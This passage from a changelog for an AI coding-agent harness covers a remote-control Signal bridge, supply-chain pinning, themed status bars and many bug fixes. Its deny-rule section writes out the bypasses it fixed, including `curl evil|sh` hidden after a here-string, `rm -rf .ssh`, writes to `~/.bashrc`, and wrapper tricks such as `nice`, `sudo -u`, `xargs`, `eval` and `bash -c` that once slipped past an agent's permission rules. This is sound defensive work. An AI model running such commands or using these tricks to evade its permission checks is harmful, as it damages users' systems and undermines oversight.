- **14: malformed rules are named.** A deny/ask rule that does not parse prints one line at
  startup, is marked in `/permissions` and appears in `halo doctor`; it is never rewritten.
- **15: Read rules reach the readers.** `cat ~/...` (and `$HOME`), `grep`/`sed`/`awk`/`cp`/`tar` and
  friends, `< file`, glob words, and `$()` bodies are checked; Grep and Glob over a directory skip
  files a Read deny rule names, and ask when a Read ask rule names one below the directory.
- **16: symlinks and Windows names.** A path rule is matched as written and with its symlinks
  resolved; on Windows trailing dots and spaces are judged as the OS opens the file.
- **24: the state tree is owner-only.** New state directories are 0700, transcripts, shadow
  index, spilled tool results and `bridge.log` are 0600; an existing tree is tightened once with
  one notice (POSIX; no-op on Windows).
- **25: ids used as file names.** A session id is validated (clear error) and `--resume` only
  joins a safe id; a `tool_use_id` becomes a safe file stem for spill files.

### Security review fix pass, round 3 (remote control, subprocesses, supply chain)

Findings 1-5, 21-23 and 26-27 of [docs/harness/SECURITY-REVIEW-2.0.10.md](docs/harness/SECURITY-REVIEW-2.0.10.md);
every finding of the review is now fixed, rejected or listed as left in
`plans/briefs/2.0.10-review/SWEEP.md`. Pins: `tests/test_security_round5.py`, `5b`, `5c`.

- **1: exact lengths.** `phrase_to_secret` raises `ValueError` unless it gets exactly 32 known
  words; the new `parse_pair_uri` and `secret_from_hex` accept exactly 64 hex characters.
- **2: the secret stays out of the chat.** After the one-time code the phone gets "Paired. Your
  signing phrase is on the Halo screen."; the phrase, link and QR are shown only by
  `halo remote signal pair` and the `/remote` dialog.
- **3: the phone permission card.** It shows the whole command (newlines and spacing kept, long
  ones as their own message or attachment) and labels `3` with the rule it writes, for example
  `3 always allow (saves rule: Bash(sudo:*))`.
- **4: no empty keys.** A `signed: true` peer with no usable secret refuses every command and
  tells you to pair again; `signed: false` is the only unsigned path.
- **5: limits.** The signature is checked before the rate limit (bad messages have their own
  10-a-minute counter), `audit.jsonl` rotates at 5 MB, pending contact requests are capped at 32
  (oldest dropped), handler exceptions leave an audit line, and the control socket caps feed
  subscribers at 16 and keeps unauthenticated connections in a separate pool of 16.
- **21: signal-cli download.** The pinned SHA-256 of the 0.14.9 archive is checked before
  unpacking (an unpinned asset refuses); gpg counts only for the pinned release key (fingerprint
  still empty, so the result reads `digest-only`); the unpacking rejects device, FIFO, link,
  absolute and `..` members.
- **22: the `cc:` route checks `--tools ""`.** A built-in tool in the child's first `system.init`
  ends the turn with an error and stops the child.
- **23: the registration PIN is off argv.** `setPin` (and `verify --pin` when offered) goes through
  signal-cli's JSON-RPC stdin; 0.14.9 has no JSON-RPC `verify`, so `--pin` is passed on argv for that
  call only, with a one-line note.
- **26: the install channel.** `install-halo.sh` / `.ps1` install the newest `vX.Y.Z` tag (`--ref`
  / `-Ref` overrides), print the tag and commit, pin the uv bootstrap, and install with
  `--constraints requirements.lock`; the README one-liners fetch the script from a tag URL.
- **27: dependencies.** `requirements.lock` is regenerated with hashes
  (`uv pip compile pyproject.toml --universal --generate-hashes -o requirements.lock`; it also
  gains the missing `pyyaml`); CI installs it with `pip install --require-hashes` and runs
  `pip-audit` through `scripts/pip_audit_gate.py` with an allowlist file, in both jobs.

## [2.0.9] - 2026-10-11

### Remote control: the session control socket

- **A per-session control socket** (`halo_harness/remote/`), behind config
  `remote.enabled` (default `false`): the TUI at mount and `halo -p` (so
  `--bg` too) open `~/.halo/run/<session_id>.ctl` (Unix socket, 0600, run dir
  0700) or, on Windows, loopback TCP on an OS-assigned port with a random
  16-byte token that must arrive as the first line within 5 s. Nothing
  listens on a non-loopback address; the token is never logged. Newline JSON,
  `{id, cmd, ...}` -> `{id, ok, result|error}`, with the commands `status`,
  `submit`, `steer`, `interrupt`, `answer` (permission / question / plan /
  approval, with the TUI's once / session / always scopes), `model`,
  `effort`, `mode`, `slash`, `tail`, `subscribe`, `unsubscribe`, `ping`. The
  socket calls `Controller` methods (a `SessionHandle` with two
  implementations: `ControllerHandle` for the TUI, `PrintModeHandle` for
  `-p`), never raw commands.
- **An event feed that cannot steal events.** `Controller.events` is now a
  tee queue: the TUI's drain stays its only reader and each put item is also
  handed to the socket's hub (print mode wraps the turn stream the same way).
  Subscribers get every event kind as-is, `text_delta`s merged into one
  `text_chunk` per 2 s / 1800 bytes, no `thinking_delta`; each has a
  256-frame queue and is dropped, never waited on, when it fills.
- **The sessions registry** `~/.halo/run/sessions.json` (atomic, locked):
  session id, cwd, pid, endpoint, start time, title (follows the auto-title
  and `/rename`), mode (follows Shift+Tab). Dead pids and endpoints that
  refuse a connect are swept; `Controller.quit()` (every quit path) and print
  mode's exit remove the entry and the socket, with an `atexit` hook for a
  crash. The `cc:` bridge's `*.sock` files and sweep are untouched.
- **`halo remote sessions`** lists the live sessions; `/remote` shows this
  session's socket and the registry count. Commands that arrive over the
  socket appear in the transcript as `(remote) ...` notes. New
  `docs/REMOTE.md`, `remote.enabled` in `docs/CONFIG.md`.

### Remote control: the Signal bridge

- **The signal-cli transport** (`remote/signal_transport.py`): spawns
  `signal-cli -a ACCOUNT --trust-new-identities never --scrub-log -d
  ~/.halo/remote/signal-cli jsonRpc ...` and talks newline JSON-RPC over stdio
  (no port, no socket file), or is a client of `daemon --socket` (POSIX) /
  `daemon --tcp` (Windows); settings from `~/.halo/remote/signal.json`.
  `send`, `sendTyping` (re-sent every 10 s, `stop` at turn end),
  `sendReceipt` (read), `listIdentities`, `trust`, `subscribeReceive`.
  Respawn/reconnect with backoff; signal-cli's `-3`/`-4`/`-5`/`-1`/`-6` codes
  map to errors (a `-5` pauses sending and surfaces the captcha token).
  Inbound `text/x-signal-plain` becomes the prompt, other attachments are
  ignored, and every downloaded file is deleted; a long reply goes out as a
  `data:` URI attachment, never a file.
- **Contact-request pairing** (`remote/pairing.py`, `peers.json` 0600): an
  unknown sender is never answered; it becomes a pending request with the
  safety number from `listIdentities`; approving it runs `trust` with that
  number and yields a six-digit, ten-minute code the phone sends back. Three
  wrong codes or expiry drop the request; a changed safety number blocks the
  peer until `reverify`; `unpair`; `remote.rate_per_minute` (30) per peer.
- **Command signing** (`remote/signing.py`): a per-peer 256-bit secret shown
  once as a `halo-remote://pair?...` link and a 32-word phrase; commands end
  `#<counter>:<hmac8>` (HMAC-SHA256 over `counter|text`), with a strictly
  increasing counter and a 5-minute window; `signed: false` turns it off.
- **The bridge** (`remote/bridge.py`, `bridge_commands.py`, `bridge_session.py`,
  `bridge_cards.py`, `render.py`): plain text is a prompt or steer; `/sessions`,
  `/attach`, `/status`, `/stop`, `/mode`, `/model`, `/effort`, `/quiet`,
  `/loud`, `/tail`, `/remote pair|unpair|status`, other `/x` as slash commands;
  permission cards answered by number, questions by letter, plans by
  `approve`/`feedback`, approval gates by `accept`/`edit`/`stop`. Replies are
  plain text (Markdown flattened, code marked monospace), split at 1800 bytes,
  or one message plus `reply.txt` past four. One hashed audit line per
  command in `audit.jsonl`; no message content is logged or stored.
- Tested against a fake signal-cli child (`tests/helpers/fake_signal_cli.py`).
  `docs/REMOTE.md` gains the pairing, signing, chat-command and storage
  sections; `remote.rate_per_minute`, `remote.verbosity`,
  `remote.stale_window_s`, `remote.pair_code_ttl_s` are in `docs/CONFIG.md`.
  The `halo remote signal` commands and the `/remote` dialog follow.

### Remote control: CLI, `/remote`, doctor

- **`halo remote signal ...`** (`remote/cli*.py`): `setup` (dedicated number or
  linked device; finds or downloads signal-cli 0.14.9 into
  `~/.halo/remote/signal-cli/dist/`, native build on Linux x86-64, JVM build
  elsewhere or with `--jvm`, `.asc` checked with `gpg` when present, the
  download only after a yes), `register` (captcha, SMS or voice, code,
  registration-lock PIN kept 0600, rate limit with `retryAfterSeconds`), `link`
  (the `sgnl://linkdevice` URI as text and a terminal QR code), `run`
  (`--daemon` writes a systemd unit, a launchd plist or a Task Scheduler XML and
  prints the one enable command), `pair` (contact requests with safety numbers,
  `--approve`, the code, then the 32-word phrase, link and QR code), `peers`,
  `unpair`, `reverify`, `status`, and the kill switch `off` / `on`
  (`remote.signal.enabled`; a stop file the bridge polls). Every verb has
  `--json`; `halo completion` offers them.
- **A stdlib QR encoder** (`remote/qr.py`, `qr_tables.py`, `qr_render.py`):
  byte and alphanumeric modes, level L, versions 1 to 10, half-block rendering;
  the Reed-Solomon tables are computed, and the output is pinned against
  published vectors and round-tripped through an independent reader in the tests.
- **The `/remote` dialog** (`tui/dialogs/remote_status.py`): bridge state,
  the control-socket line, the paired phones, contact requests with Approve (the
  code shown large, then the signing phrase and link once), per-phone signed
  toggle, Unpair, Reverify and the kill switch; `/remote status|pair [N]|off`
  as text; bridge notices become TUI notifications. The bridge is never started
  inside the TUI.
- **The `remote` status chip** (`⇄ remote 1`, ASCII `<> remote 1`) in the
  default status bar and as a ticker slot in the DOOM, Metroid and Mario skins,
  driven by a new `note` command on the control socket (the one protocol
  addition: `remote.attached`, with `remote_attached` in `status`).
- **`halo doctor`**: remote control checks (`remote`, `remote_bridge`,
  `remote_signal_cli` with the 0.14.9 pin and a warning at 90 days,
  `remote_jre`, `remote_dir` permissions, `remote_egress` hosts behind a
  proxy), writing nothing.
- **Docs**: `docs/REMOTE.md` completed (threat model, the two identity models,
  setup per OS, the proxied-VM recipe, pairing walkthrough, service files, the
  live checklist and the checks to confirm on the first live run); the
  `remote-dialog` screenshot; COMMANDS, SLASH-COMMANDS, CONFIG, HANDBOOK, README.

## [2.0.8] - 2026-10-11

### Theme pack: Mario

- **The Mario skin** (`tui/hud_mario.py`, the third `HudSkin` on the engine):
  a three-row top bar. SCORE is the tokens left, POWER the context left as six
  blocks with the exact percent, COINS the cost behind a coin glyph with the
  provider balance beside it, then an original cap-and-moustache face (idle,
  thinking, writing, error, needs-you), WORLD (the cwd's last component, the
  branch as the level), TIME (the turn clock counting up, the last turn's time
  when idle), TURNS and TOOLS as lives-style counters, and PIPES (providers).
  Everything else rides the bottom-border ticker; the cascade keeps phase,
  POWER, cost, face, WORLD, mode, needs-you, permission and offline, keeps
  coins, timer and world in 80 columns and falls back to ASCII without
  truecolor. `PLACEHOLDER_ACCENTS` is now empty (the mechanism stays for any
  future theme).
- **Two palettes as variants of the one theme:** `bros` (night sky, brick red,
  pipe green, coin gold; the default) and `world` (a brighter sky,
  question-block orange, feather yellow, pipe green), each with its own HUD
  colours and coin glyph. `/mario <variant>` and `/theme mario <variant>` pick
  one (bare `/mario` is still the round 1 toggle and leaves the variant
  alone), persisted as `theme_variant` (`halo config set theme_variant ...`
  validates it against both games); the wizard's Theme step shows the two
  variants when `mario` is highlighted. Confirmation messages say "palette"
  for Mario and "area" for Metroid.
- **Brick cards, a pipe input and the 1-UP / coin cues:** cards, dialogs and
  panels get a brick-pattern border (a `brick` Textual border type registered
  by `tui/borders.py` and styled in `tui/styles_brick.tcss`; ASCII borders
  without truecolor), the input line a pipe frame (`╞` `╡`; `[` `]` without
  truecolor). When a sub-agent finishes or a background job completes the face
  slot flashes a 1-UP or a spinning coin for about two seconds, from a Textual
  timer on the status bar. No sounds.
- **Engine seams, generic and pinned:** `HudSkin.cues` (`{event: frames}`)
  with `StatusBar.fire_cue(event)` (a no-op returning False for any skin
  without that cue, so DOOM and Metroid are untouched), triggered from
  `subagent_end`, the delivered job-completion `status_notice` and a drop in
  the polled background-job count; `render_hud(..., cue=...)`; a turn clock on
  the status bar (`hud_turn_seconds`) behind the `elapsed` slot, which now
  holds the last turn's time while idle. `tui/theme_mario.py` holds the two
  palettes; `theme.GAME_VARIANTS` gains `mario` and `VARIANT_NOUNS`.
- **Docs and gallery:** HANDBOOK Themes (the Mario HUD fields table, the
  palettes, the brick and pipe chrome, the cues), SLASH-COMMANDS
  `/mario [variant]`, CONFIG `theme_variant`, the README themes table with the
  Mario render (all three rows now have one), `scripts/screenshots.py` scene
  `theme-mario`, and thirteen new TUI snapshots (five faces, four width tiers,
  two palettes, the 1-UP cue, a brick permission card) under
  `docs/harness/tui-snapshots/`. Tests: `tests/test_hud_mario.py`.

### Theme pack: Metroid

- **The Metroid skin** (`tui/hud_metroid.py`, one more `HudSkin` on the
  round 1 engine): a three-row suit HUD. ENERGY is the context meter as ten
  energy tanks (one per ten percent remaining) with the exact number beside
  them, RESERVE the tokens left, MISSILE the turns taken this session,
  SUPER the tools loaded, then an original visor-slit face (idle, thinking,
  writing, error, needs-you), COST, BEAM (providers) and AREA (the cwd's
  last component with the branch as its sub-label). Everything else the
  status bar shows rides the bottom-border ticker; the cascade keeps phase,
  ENERGY, cost, face, AREA, mode, needs-you, permission and offline, renders
  in 80 columns and falls back to ASCII without truecolor. The `metroid`
  palette is no longer a placeholder accent on the default layout.
- **Five areas as variants of the one theme:** Crateria (blues and greys,
  the default), Brinstar (greens and pinks), Norfair (reds and oranges),
  Maridia (teals), Tourian (greys), each with its own palette, HUD colours
  and AREA prefix glyph. `/metroid <area>` and `/theme metroid <area>` pick
  one (bare `/metroid` is still the round 1 toggle and leaves the area
  alone), persisted as `theme_variant` in `~/.halo/config.json`
  (`halo config set theme_variant ...` validates it); the wizard's Theme step
  shows the five areas when `metroid` is highlighted.
- **Map-grid panels and the visor input:** under `metroid` cards, dialogs,
  the diff and folded-history panels, the completion popup and the which-key
  overlay get dashed borders (ASCII borders without truecolor), and the
  input line is framed by `◖` and `◗` (`(` and `)` without truecolor). Both
  are declared on the skin (`panel_border`, `input_frame`) and applied as
  `hud-border-*` / `hud-visor` classes on the app, the way `hud-heavy` is.
- **Engine seams, all generic:** `HudSkin.meter_cells` (the meter length),
  `HudSkin.variants` plus `skin_for(theme, variant)` (per-variant styles and
  glyphs), `panel_border` / `input_frame` and their ASCII forms, an optional
  `meter_off` style for empty meter cells, and two new slots: `turns` (a
  per-session user-turn counter on the status bar) and `area`.
  `tui/theme_metroid.py` holds the five palettes; `theme.py` gains
  `GAME_VARIANTS` and `variant_for`. DOOM renders byte for byte as before.
- **Docs and gallery:** HANDBOOK Themes (the Metroid HUD fields table, the
  areas, the map-grid and visor chrome), SLASH-COMMANDS `/metroid [area]`,
  CONFIG `theme_variant`, README themes table with the Metroid render,
  `scripts/screenshots.py` scene `theme-metroid`, and fifteen new TUI
  snapshots (five visor faces, four width tiers, five areas, a map-grid
  permission card) under `docs/harness/tui-snapshots/`. Tests:
  `tests/test_hud_metroid.py` and the shared `tests/helpers/hud_skin_checks.py`.

### Theme pack: the game-HUD engine and DOOM

- **Three new theme names:** `doom`, `metroid` and `mario` join the built-in
  themes (nine names in all; the game themes have no `-ansi` or
  `-daltonized` siblings). They appear in the wizard's Theme step with a
  one-line description each, in `/theme` Tab completion (game themes first)
  and as slash commands. `metroid` and `mario` carry their palette and accent
  today; their status-bar skins land in the next two rounds (Metroid's, in the section above, is the first).
- **Toggle contract, one rule for all three:** `/doom`, `/metroid` and
  `/mario` remember the active theme as `theme_toggle_previous` in
  `~/.halo/config.json` and apply the game theme; running the same command
  again restores the remembered theme (`claude-dark` when none) and clears
  the key. Going straight from one game theme to another keeps the original
  previous, so `/doom`, `/metroid`, `/metroid` returns to what was active
  before `/doom`. `/theme <name>` and the wizard record the previous the
  same way when moving onto a game theme and clear it when moving off. The
  state survives a relaunch. New module `halo_harness/theme_toggle.py`.
- **A game-HUD status-bar engine** (`tui/hud.py`, `hud_render.py`,
  `hud_fields.py`): a skin is a declaration (`HudSkin`) of ordered
  segments, each `(slot, label, glyphs, width_min)`, a face table for the
  phase, border and meter glyph sets (with an ASCII set for terminals
  without truecolor), a drop order and a compact form. Slots name the
  status bar's own fields (tokens, context, tools, cost, providers, cwd,
  mode, effort, phase, needs-you, agents and the rest), so every value the
  default bar shows stays reachable. The status bar renders through the
  active theme's skin and through today's layout otherwise.
- **The DOOM skin:** dark greys, blood reds, rust browns, muted greens and
  amber text; heavy borders on cards, panels and dialogs; a three-row bottom
  HUD with ammo (tokens remaining), health (context remaining percent with a
  meter), arms (tools loaded), an original ASCII face (idle, thinking,
  writing, error, needs-you), armor (cost or balance) and keys (providers),
  plus a ticker line in the bottom border for mode, effort, model, cwd and
  branch, agents, background jobs, offline, the governor and the rest. The
  width cascade drops parts in a declared order and keeps phase, context,
  cost, cwd and mode at the narrowest; below 46 columns it becomes one line.
- **Status feed:** the MCP status carries a tool count (`tools`) for the
  HUD's arms panel, and an `error` event shows the error face until the next
  model call starts.
- **Docs and gallery:** HANDBOOK Themes section (names, toggles, the DOOM HUD
  fields table), SLASH-COMMANDS entries for `/doom`, `/metroid` and
  `/mario`, CONFIG `theme_toggle_previous`, README themes table with the DOOM
  render, `scripts/screenshots.py` scene `theme-doom`, and nine new TUI
  snapshots (every face state and four width tiers) under
  `docs/harness/tui-snapshots/`.

## [2.0.7.1] - 2026-10-10

### vibes/review.md fix pass, round 10 (telemetry, stats, shared state)

- **f84:** a sub-agent's spend is charged to the child's own model row in
  `stats --models` (and in the session `/stats` per-model table). The
  rollup node written into the parent's log now carries the child's
  model/provider/route (the heaviest by tokens when it used several), and
  the aggregator keys a rollup by those without moving the session's current
  model. A rollup logged before the model was recorded gets a `(sub-agents)`
  row instead of inflating the parent's.
- **f85:** the stats cache carries a schema version; a cache from an older
  summarizer is rebuilt instead of served (older sessions never gained the
  newer fields), and entries for deleted session files are pruned on scan.
- **f86:** `halo replay --turn N` skips every user-node kind the log
  writes (continuation, compaction summary and tail, background agent and
  job notices, steer), so N counts real prompts only.
- **f87:** with no `/proc` (macOS) the run's start-time fingerprint comes
  from `ps -o lstart=`, so the PID-reuse guard works there; a run whose
  `status.json` exists is over regardless of what now owns the pid.
- **f88:** the recall index is written through a temp file of its own per
  write, prunes only entries whose source file is gone (it used to drop
  every other project's memory vectors), and reads a session log again only
  when its mtime changed (streamed, stopping once it has what it needs).
- **f89:** log readers (replay and its fork truncation, recall, the
  session node reader, the session picker, prompt history) split records at
  newline only; a record holding U+2028/U+2029 is no longer cut in two and
  lost.
- **f90:** a gym result with no digest is filed under its model name instead
  of one shared `nodigest.json`; `run_gym_for_model` really never raises (a
  failure comes back as an error result); the scratch directory a run makes
  is removed when it ends.
- **f91:** `echo task | halo --bg -p` reads the piped input (same 10 MB cap
  as a foreground `-p`), spools it in the run directory and hands it to the
  detached child as its stdin; a prompt on the command line reads nothing.
- **f92:** `state.json`, `update-check.json` and `history.jsonl` writes are
  serialized across processes with a small advisory lock (new
  `halo_harness/filelock.py`; it never hangs or fails a launch), temp files
  are unique per write, `state.json` and a new `history.jsonl` are created
  0600, and a history entry never glues onto a torn last line.
- **Sweep (still open after round 9):** f26 -- jobs a schedule or trigger
  fires carry `HALO_SCHEDULED_FIRE=1` and do not arm the team's schedules
  again; f31 -- a lone surrogate in a tool result no longer ends the MCP
  bridge connection thread. f18 is rejected with a pin: an https URL is
  never retried as http (only a typed http URL returns to http after its
  https upgrade fails). `plans/briefs/2.0.7-fixpass/SWEEP.md` lists every
  finding's status.
- Tests: `tests/test_review2_round10.py`, `round10b`, `round10c`.

### vibes/review.md fix pass, round 9 (TUI + CLI/doctor)

- **f67:** the xclip/xsel fallback copy no longer reports a copy that landed
  as failed after 3 seconds. Those tools fork a daemon that keeps the
  inherited stdout pipe open, so the old captured-stdout run waited out its
  timeout; stdout now goes to the null device and stderr to a temp file, read
  back so a real failure keeps its message (`last_copy_error()`).
- **f68:** a typed slash command (including one typed while a card is
  pending) no longer discards the pending image attachments: the chips and
  their records stay for the next real prompt, and `/images` can list them.
- **f69:** shadow snapshots (Write/Edit/NotebookEdit and Bash) are recorded
  on one FIFO worker thread instead of running git on the TUI thread, the
  mutating `ShadowStore` methods share one lock, and `/undo`/`/redo`/
  `/rewind` wait for queued snapshots before restoring.
- **f70:** ctrl+s in the roles editor while the effort prompt is open commits
  the model just picked (with the effort typed so far) before saving; an
  unrecognized effort is reported and nothing is saved.
- **f71:** pending-card hand-offs are serialized behind one lock and every
  card goes through the queue, so a card arriving while the next one is being
  handed to the dock can no longer be shown over (and orphaned by) it, and a
  late dock clear never hides a live card.
- **f72:** recalling a pasted prompt with Up restores its paste contents
  (history stores them), so the model gets the pasted text instead of the
  literal `[Pasted text #1 ...]` placeholder.
- **f73:** each image chip keeps the label it was attached under; deleting a
  chip by selecting over it, cutting it or clearing the box now drops its
  image, and the surviving chips keep their numbers.
- **f74:** save in the lineup editor stops on invalid YAML (or a non-mapping)
  in any section and names the section, instead of silently writing the old
  value.
- **f75:** `/clear` resets the first-turn counter so the new context is
  auto-titled; stream-json clears its background notices after each result
  (they repeated in every later result) and writes the final assistant line
  when the budget limit stops a turn.
- **f76:** `-p -c` with no earlier session, and a bare `-r`, now fail with
  exit 2 and a message instead of starting a new session and exiting 0;
  `-r <path>.jsonl` from another project imports that transcript into this
  project's sessions so the resume has its history.
- **f77:** `halo providers setup openai|huggingface|experiential|
  codex_subscription` no longer dies in argparse: on a terminal it opens the
  init wizard, otherwise it names the variable or login to set. Doctor's
  setup suggestions only use `--provider` values `halo init` accepts, and
  fall back to plain `halo init`.
- **f78:** `doctor --agents/--roles/--teams/--local --json` print nothing but
  the JSON, and `--work --probe-all --json` prints its probe rows as JSON.
- **f80:** the `~/.local/bin` PATH check starts its shell without halo's own
  `PATH` (it always passed before) and starts bash as a login shell, which is
  what reads the rc file; the rc file written is the one a login bash reads
  (`~/.bash_profile` or `~/.bash_login` when present, else `~/.profile`).
- **f82:** `--fork-session --no-session-persistence` deletes the fork it made
  (it was treated as a pre-existing log and only truncated).
- **f83:** `-w` validates `--session-id` and `-c`/`-r` before creating the
  worktree, so a bad flag leaves nothing behind; a resumed session is copied
  into the worktree's project so `-w -c` finds its history.

### vibes/review.md fix pass, round 8 (loop scheduling + sub-agents/roles)

- **f49:** read-only calls the model listed BEFORE an Agent call in one
  message now run (and are logged) before that sub-agent starts, instead of
  being deferred until after it and observing its edits.
- **f50:** the read-only pool no longer cuts a batched Bash command off at
  30 s: it waits the command's own timeout (the model's `timeout`, else the
  tool default, clamped to the tool maximum) plus a short grace. Every other
  tool keeps the 30 s cap. (The whitelist half of the finding -- `env`,
  `find -delete`/`-exec`, `git branch -D`, `git tag -d` -- was already closed
  in earlier rounds.)
- **f51:** text typed while a manual `/compact` or `/clear` held the session
  busy is now resubmitted, in arrival order, as the next turn the moment that
  command ends; it used to sit in the leftover list until some later turn
  finished.
- **f52:** the forced `tool_choice=required` retry no longer feeds the
  context-overflow sentinel to the usage accounting (an AttributeError); it
  compacts once and retries once more, and falls back to the original reply
  if that still yields nothing.
- **f53:** Esc no longer starts read-only calls or sub-agents that were only
  queued (they finish as "interrupted"), including when the interrupt lands
  after the last call was queued; a permission or question slot parked
  between "resolved" and "waiting" is released instead of living for the
  rest of the session.
- **f54:** the concurrent-resume guard for `Agent(task_id=...)` is claimed
  atomically under the runtime lock; two resumes of one task in one message
  can no longer both build a session over the same child log.
- **f55:** a Stop-hook continuation on a `cc:` route is now read in the same
  turn (a fresh reader drains claude's reply, and the Stop hook sees it);
  before, the reply leaked into the next turn, and `-p` mode dropped it.
- **f56:** resuming a task keeps the `role=`, `model=` and `effort` it was
  spawned with (stored on the task record and in its meta.json, restored
  after a restart); an explicit value on the resume call still wins. An org
  task's name, depth and concurrency are persisted the same way.
- **f57:** a team's `delegation.max_parallel` now lives on the runtime too,
  so each Agent batch no longer resets the gate to `agents.max_concurrent`.
- **f58:** the live role table is recomputed in place on `/roles on|off` and
  on a `/model` provider switch (session and team additions are kept), and
  an explicit `CLAUDE_CODE_SUBAGENT_MODEL` / `subagentModel` now beats the
  cost-aware Databricks default instead of losing to its `researcher` row.
- **f60:** a role the active team (or the session's resolved role table)
  defines is accepted by `Agent(role=...)`, batch/count fan-out items and
  resumes, not just the built-ins and the persisted config table.
- **f61:** an agent file's `tools: Agent(X)` content restriction now reaches
  the sub-agent it describes (an org position's explicit `reports` set still
  wins).
- **f62:** agent export writes the keys the loader reads (`permissionMode`,
  `mcpServers`, `maxTurns`), and dumps lists indented so the loader's
  block-list reader reads them back.
- **f64:** a failed model resolve no longer strands the `isolation:
  worktree` tree it had already created; a resumed org starts with the
  budget it had left (the interrupted run's spend is recorded in
  `org-run.json`); `validate_org` reports a non-string `reports` entry as a
  problem line instead of raising.

### Fixes carried from the owner's second clone

- fix: tool-arg schema validation no longer crashes on union types (`type` as a list), needed by MCP servers whose schemas declare `string|null` (cherry-picked as e521b24).

### Ctrl+C copies; quitting asks

Owner report (2026-10-09): one Ctrl+C in a PowerShell session closed Halo.
- fix: on a Windows console the TUI no longer lets Ctrl+C end the process.
  The console input handle's `ENABLE_PROCESSED_INPUT` flag (the thing that
  turns Ctrl+C into a `CTRL_C_EVENT` / SIGINT instead of a key) is cleared
  for the TUI's lifetime and re-cleared every half second if another
  console process switches it back on, and a control handler swallows
  `CTRL_C_EVENT`; the mode is restored on exit, crash included
  (`halo_harness/tui/console_mode.py`, inert on POSIX; print mode keeps
  SIGINT = exit 130).
- change: the first Ctrl+C copies -- a selection (chat box, any text field,
  transcript range), else the last assistant reply -- and toasts "Copied N
  characters" or "Nothing to copy". It no longer interrupts a running turn
  (Esc does) or clears the chat box.
- change: a second Ctrl+C within 3 s (was 1.5 s) opens a "Quit Halo? Enter
  quits, Esc stays" card instead of quitting; `quit_on_double_ctrl_c:
  false` makes every press just copy. Ctrl+D, Ctrl+Q and `/exit` unchanged.

### Subscription routes are off until accepted

The owner's own decision (2026-10-09): a detected Claude Code/Codex
subscription no longer offers `cc:`/`cx:` on its own -- both routes stay
off, on every fresh AND every upgraded install (no migration flips this
on), until a one-time notice ("Your subscription, a third-party harness")
is accepted, once per machine. `halo subscriptions status|accept|revoke`
and the TUI's `/subscriptions` are the new surfaces; a hand-typed
`--model cc:...`/`--model cx:...`, the bare subscription alias, the
`/model` picker, `halo models`, a lineup/bio naming either route, `halo
doctor`, `/providers`, and the `init` wizard's Providers step all show or
enforce the gate. See docs/MODELS.md's "Subscription-routes consent"
section.

### vibes/review.md fix pass, round 5 (R9/R10 slice + the pyflakes CI gate)

The last slice of the owner's whole-tree review that fits this pass --
everyday-reliability and correctness items, plus the review's own
suggested CI gate. The remaining findings (MCP internals 43-46, loop
scheduling 49-53, sub-agent/roles 54-58/60-62/64, TUI 67-75, CLI/doctor
76-80/82-83, telemetry 84-92, and the rest of the P2s) are enumerated in
plans/HANDOFF.md for the next session.

- **f48:** slash-command `$ARGUMENTS`/`$N` substitution is now ONE pass:
  a `$5` inside the user's own arguments is no longer re-replaced,
  `$1` inside single quotes (an awk body) stays literal, and
  `$ARGUMENTS[N]` works as the docstring always claimed.
- **f50 (batch half):** the concurrent read-only batch's whitelist drops
  `env` (dumps secrets into shared results / runs commands) and `find`
  (`-delete`/`-exec`); `git branch`/`git tag` join only in list form.
- **f59:** `resolve_role_ref` no longer raises on `inherit` or an
  unresolvable role value -- `/roles` stopped crashing and the confidence
  judge stopped silently answering "confident".
- **f63:** cron day-of-week `7` is Sunday (both spellings agree), and
  day-of-month/day-of-week are ORed when both are restricted (standard
  cron) -- impossible-schedule minute-scans under the lock are gone.
- **f65:** in-TUI `/resume` and Ctrl+P now actually switch sessions: the
  session's log is reopened on the picked id (the next prompt appends to
  the resumed file) with a fresh cost meter.
- **f66:** the lineup editor commits on submit/blur/pick instead of every
  keystroke -- spaces and commas can be typed again.
- **f81:** `halo preflight` identifies the lane from `HALO_MODEL`,
  config.json, or routes.json; when NO lane can be identified it fails
  loudly (exit 2) instead of printing "PASS (0 lane(s) checked)" -- a
  vacuous pass is worse than none.
- **pyflakes CI gate:** the suites workflow runs pyflakes over the
  package before the trio, failing on any "undefined name" (every
  crash-class finding this pass fixed was one); four more latent
  `Optional` annotations fixed to make it green (stats_cli, completion,
  model_picker x2).
- **P2s:** the canary token estimate excludes base64 image data (no more
  false truncation warnings on image conversations); NotebookEdit
  categorization reads `notebook_path` (acceptEdits no longer asks for
  every notebook edit); privacy-scan `ci:` terms match regardless of
  case; one unreachable `return` removed from models_dev.

Tests: `tests/test_review2_round5.py` (6 pins). Suites re-run green:
commands_registry 21/21, round_2_preflight 8/8, wizard_lineup 10/10,
roles 18/18, agents_schedule 6/6 (one timing flake re-run green),
privacy_scan unchanged from HEAD (one pre-existing failure), full-package
pyflakes 0 undefined names.

### vibes/review.md fix pass, round 4 (R8: deny-rule integrity)

The permission contract, hardened -- per the standing order this round
makes the ONE gate that exists (explicit deny/ask rules) actually hold,
and adds nothing to auto mode with no rules: every fix is pinned by
`tests/test_review2_round4.py`'s invariant -- *deny when a deny rule
exists, stay allowed in auto when none does*. The review's
classifier-shaped suggestions (env-var allowlists, allow-match
substitution refusal, blanket here-string rejection, the sed/redirect
heuristic pile) remain intentionally NOT applied.

- **f1:** a here-string (`<<<`) is no longer mis-parsed as a heredoc --
  `cat <<< x; curl evil|sh` splits into two commands again (the old
  parse swallowed the whole line as a "heredoc body", hiding everything
  after the here-string from both allow and deny matching).
- **f2:** deny rules survive wrappers, grouping and re-naming:
  `nice -n 5 rm`, `timeout -s KILL 5 rm`, `sudo -u root rm`, `env -i
  rm`, `xargs -0 rm` (per-wrapper value-option stripping), `( rm )`,
  `{ rm; }`, `<(rm)`, `$(true; rm)` (group/subshell bodies, and their
  own segment splits), `/bin/rm` (basename candidates), and `eval` /
  `bash -c` (opaque to the matcher: asked about whenever a Bash deny/ask
  rule exists, untouched in auto with none).
- **f5:** the read-only git whitelist no longer runs commands or mutates:
  `git grep -O<cmd>`/`--open-files-in-pager` blocked; `branch`/`tag`
  read-only only in their LIST forms (`git branch newname` and
  `git tag -d` were "read-only").
- **f6 (contained):** the acceptEdits edit-in-workdir auto-allow drops
  `sed` (its `e` command executes a shell), and rejects redirects,
  `--opt=path` with path separators, and glob/brace tokens
  (`touch a >~/.bashrc`, `cp a --target-directory=/etc`,
  `rm -rf {..,x}` no longer auto-allow).
- **f7:** Bash paths are judged against the LIVE working directory --
  `cd ~; rm -rf .ssh` is no longer auto-allowed in acceptEdits as
